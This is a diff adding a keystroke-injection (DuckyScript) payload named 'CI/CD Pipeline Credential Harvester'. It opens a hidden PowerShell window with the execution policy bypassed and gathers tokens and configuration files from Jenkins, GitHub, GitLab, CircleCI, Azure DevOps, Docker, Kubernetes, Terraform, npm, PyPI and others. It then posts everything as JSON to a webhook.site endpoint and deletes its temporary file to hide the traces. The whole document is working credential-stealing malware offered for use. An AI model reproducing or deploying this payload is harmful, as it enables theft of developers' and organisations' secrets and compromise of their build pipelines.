@@ -1,0 +1,112 @@
+REM NullSec - CI/CD Pipeline Credential Harvester
+REM Extracts secrets from CI/CD tools and configs
+REM Jenkins, GitLab, GitHub Actions, CircleCI, etc
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+
+STRING $cicd = @{}
+ENTER
+
+REM Jenkins
+STRING $cicd.Jenkins = @{}
+STRING $jenkinsHome = "$env:USERPROFILE\.jenkins","$env:ProgramFiles\Jenkins","$env:ProgramData\Jenkins" | Where-Object {Test-Path $_}
+ENTER
+STRING if ($jenkinsHome) {
+    $cicd.Jenkins.Home = $jenkinsHome
+    $cicd.Jenkins.Credentials = Get-Content "$jenkinsHome\credentials.xml" -ErrorAction SilentlyContinue
+    $cicd.Jenkins.Secrets = Get-ChildItem "$jenkinsHome\secrets" -ErrorAction SilentlyContinue | Select Name
+}
+ENTER
+DELAY 300
+
+REM GitHub CLI credentials
+STRING $cicd.GitHub = @{}
+STRING $cicd.GitHub.Config = Get-Content "$env:APPDATA\GitHub CLI\hosts.yml" -ErrorAction SilentlyContinue
+STRING $cicd.GitHub.Token = $env:GITHUB_TOKEN
+STRING $cicd.GitHub.Actor = $env:GITHUB_ACTOR
+ENTER
+DELAY 200
+
+REM GitLab credentials
+STRING $cicd.GitLab = @{}
+STRING $cicd.GitLab.Token = $env:GITLAB_TOKEN
+STRING $cicd.GitLab.Config = Get-Content "$env:USERPROFILE\.gitlab-ci.yml" -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+REM CircleCI
+STRING $cicd.CircleCI = @{}
+STRING $cicd.CircleCI.Token = $env:CIRCLECI_TOKEN
+STRING $cicd.CircleCI.Config = Get-Content "$env:USERPROFILE\.circleci\cli.yml" -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+REM Travis CI
+STRING $cicd.Travis = @{}
+STRING $cicd.Travis.Token = $env:TRAVIS_TOKEN
+STRING $cicd.Travis.Config = Get-Content "$env:USERPROFILE\.travis\config.yml" -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+REM Azure DevOps
+STRING $cicd.AzureDevOps = @{}
+STRING $cicd.AzureDevOps.PAT = $env:AZURE_DEVOPS_EXT_PAT
+STRING $cicd.AzureDevOps.Org = $env:AZURE_DEVOPS_ORG
+ENTER
+DELAY 200
+
+REM Docker configs
+STRING $cicd.Docker = @{}
+STRING $cicd.Docker.Config = Get-Content "$env:USERPROFILE\.docker\config.json" -ErrorAction SilentlyContinue
+STRING $cicd.Docker.Credentials = Get-Content "$env:USERPROFILE\.docker\credentials" -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+REM Kubernetes
+STRING $cicd.Kubernetes = @{}
+STRING $cicd.Kubernetes.Config = Get-Content "$env:USERPROFILE\.kube\config" -ErrorAction SilentlyContinue
+STRING $cicd.Kubernetes.Contexts = kubectl config get-contexts 2>$null
+ENTER
+DELAY 200
+
+REM Terraform
+STRING $cicd.Terraform = @{}
+STRING $cicd.Terraform.Credentials = Get-Content "$env:APPDATA\terraform.d\credentials.tfrc.json" -ErrorAction SilentlyContinue
+STRING $cicd.Terraform.CloudToken = $env:TF_TOKEN
+ENTER
+DELAY 200
+
+REM Ansible
+STRING $cicd.Ansible = @{}
+STRING $cicd.Ansible.Vault = Get-ChildItem -Recurse -Filter "*.vault" -Path "$env:USERPROFILE" -ErrorAction SilentlyContinue | Select FullName
+ENTER
+DELAY 200
+
+REM NPM
+STRING $cicd.NPM = @{}
+STRING $cicd.NPM.RC = Get-Content "$env:USERPROFILE\.npmrc" -ErrorAction SilentlyContinue
+STRING $cicd.NPM.Token = $env:NPM_TOKEN
+ENTER
+DELAY 200
+
+REM PyPI
+STRING $cicd.PyPI = @{}
+STRING $cicd.PyPI.RC = Get-Content "$env:USERPROFILE\.pypirc" -ErrorAction SilentlyContinue
+ENTER
+DELAY 200
+
+REM Export all
+STRING $cicd | ConvertTo-Json -Depth 5 | Out-File "$env:TEMP\cicd_creds.json"
+ENTER
+DELAY 200
+
+STRING try { Invoke-RestMethod -Uri "https://webhook.site/YOUR-ID" -Method Post -Body ($cicd | ConvertTo-Json -Depth 5 -Compress) -ContentType "application/json" } catch {}
+ENTER
+DELAY 500
+
+STRING Remove-Item "$env:TEMP\cicd_creds.json" -Force 2>$null; exit
+ENTER
